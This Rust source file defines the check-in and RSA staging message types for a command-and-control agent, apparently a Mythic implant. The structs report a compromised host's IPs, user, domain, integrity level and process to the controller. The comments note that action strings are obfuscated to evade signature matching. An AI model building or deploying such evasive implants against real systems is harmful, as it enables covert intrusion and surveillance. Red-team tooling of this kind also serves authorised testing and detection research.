//! Check-in and staging message types.
//!
//! These are sent in the clear (or under a static key) during the initial
//! callback registration. Action strings are obfuscated at compile time to
//! avoid trivial string matching on the agent binary.

use serde::{Deserialize, Serialize};

/// Initial check-in request sent by the agent to register a new callback.
#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
pub struct ReqCheckin {
    pub action: String,
    pub uuid: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ips: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub os: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub architecture: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub external_ip: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub encryption_key: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub decryption_key: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_name: Option<String>,
}

impl ReqCheckin {
    /// Start a check-in for the given payload UUID; all other fields are empty.
    pub fn for_uuid(uuid: &str) -> Self {
        Self {
            action: obfstring!("checkin"),
            uuid: uuid.to_string(),
            ..Default::default()
        }
    }

    /// Full constructor. Prefer [`ReqCheckin::for_uuid`] + builder-style setters
    /// when only a few fields are populated.
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        uuid: &str,
        ips: Vec<String>,
        os: Option<String>,
        user: Option<String>,
        host: Option<String>,
        pid: Option<u32>,
        architecture: Option<String>,
        domain: Option<String>,
        integrity_level: Option<u32>,
        external_ip: Option<String>,
        encryption_key: Option<String>,
        decryption_key: Option<String>,
        process_name: Option<String>,
    ) -> Self {
        Self {
            action: obfstring!("checkin"),
            uuid: uuid.to_string(),
            ips,
            os,
            user,
            host,
            pid,
            architecture,
            domain,
            integrity_level,
            external_ip,
            encryption_key,
            decryption_key,
            process_name,
        }
    }
}

/// Mythic's response to a successful check-in.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RespCheckin {
    pub action: String,
    pub id: String,
    pub status: String,
}

impl RespCheckin {
    pub fn new(id: String, status: String) -> Self {
        Self {
            action: obfstring!("checkin"),
            id,
            status,
        }
    }

    pub fn success(id: String) -> Self {
        Self::new(id, obfstring!("success"))
    }
}

/// RSA staging request used during EKE (encrypted key exchange) setup.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ReqStagingRSA {
    pub action: String,
    pub pub_key: String,
    pub session_id: String,
}

impl ReqStagingRSA {
    pub fn new(pub_key: String, session_id: String) -> Self {
        Self {
            action: obfstring!("staging_rsa"),
            pub_key,
            session_id,
        }
    }
}

/// RSA staging response containing the AES session key.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RespStagingRSA {
    pub action: String,
    pub uuid: String,
    pub session_key: String,
    pub session_id: String,
}

impl RespStagingRSA {
    pub fn new(uuid: String, session_key: String, session_id: String) -> Self {
        Self {
            action: obfstring!("staging_rsa"),
            uuid,
            session_key,
            session_id,
        }
    }
}
